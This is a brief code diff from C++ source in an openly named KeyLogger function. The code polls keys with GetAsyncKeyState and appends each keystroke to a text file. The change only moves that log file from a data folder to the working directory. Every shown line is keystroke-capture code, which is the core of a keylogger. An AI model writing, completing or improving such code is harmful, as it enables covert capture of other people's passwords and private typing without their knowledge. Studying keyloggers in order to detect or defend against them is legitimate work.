@@ -30,7 +30,7 @@ void KeyLogger(void)
             {
                 // GetAsyncKeyState checks if a specific key was pressed.
                 // -32767 indicates a key press event.
-                std::ofstream write("data/Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
+                std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
 
                 if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                 {
